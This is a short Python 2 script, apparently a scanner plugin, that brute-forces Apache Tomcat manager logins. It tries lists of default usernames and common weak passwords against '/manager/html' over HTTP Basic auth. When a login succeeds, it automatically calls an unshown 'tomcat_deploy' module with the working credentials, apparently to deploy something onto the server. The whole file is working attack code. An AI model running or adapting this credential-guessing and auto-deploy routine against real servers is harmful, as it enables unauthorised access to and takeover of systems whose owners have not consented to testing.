#coding:utf-8
#author:wolf@future-sec
import urllib2
import base64
def check(host,port,timeout):
    url = "http://%s:%d"%(host,int(port))
    error_i=0
    flag_list=['Application Manager','Welcome']
    user_list=['admin','manager','tomcat','apache','root']
    pass_list=['','123456','12345678','123456789','admin123','123123','admin888','password','admin1','administrator','8888888','123123','admin','manager','tomcat','apache','root']
    for user in user_list:
        for password in pass_list:
            try:
                login_url = url+'/manager/html'
                request = urllib2.Request(login_url)
                auth_str_temp=user+':'+password
                auth_str=base64.b64encode(auth_str_temp)
                request.add_header('Authorization', 'Basic '+auth_str)
                res = urllib2.urlopen(request,timeout=timeout)
                res_code = res.code
                res_html = res.read()
            except urllib2.HTTPError,e:
                res_code = e.code
                res_html = e.read()
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 'NO'
                continue
            if int(res_code) == 404:
                return 'NO'
            if int(res_code) == 401 or int(res_code) == 403:
                continue
            for flag in flag_list:
                if flag in res_html:
                    info = '%s Tomcat Weak password %s:%s'%(login_url,user,password)
                    try:
                        deploy = __import__("tomcat_deploy")
                        re = deploy.run(host,port,timeout,'Basic '+auth_str)
                        if re:
                            info += re
                    except Exception,e:
                        print e
                        pass
                    return 'YES|'+info
    return 'NO'